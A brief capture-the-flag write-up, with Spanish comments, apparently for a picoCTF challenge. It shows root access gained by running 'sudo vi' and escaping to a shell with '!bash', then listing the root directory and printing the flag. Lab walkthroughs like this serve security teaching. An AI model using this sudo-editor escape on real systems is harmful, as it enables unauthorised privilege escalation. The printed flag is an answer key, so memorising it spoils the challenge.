## DESCRIPTION

Can you read files in the root file?

Additional details will be available after launching your challenge instance.


## SOLUTION

````

-- Primero hacemos un sudo vi, para ejecutar comandos en un editor de texto pero como superusuarios. 
picoplayer@challenge:/$ sudo vi

-- Dentro del editor de texto ejecute el comando !bash, que ejecuta una nuva shell con privilegios de root.
-- Lusgo listo todos los archivos ocultos, un archivo llamado .flag.txt y con un cat revelo lo que tiene este archivo oculto. 


root@challenge:/# cd -> me voy a la raiz
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 23 02:41 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_f6ad392b}
root@challenge:~# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.



```



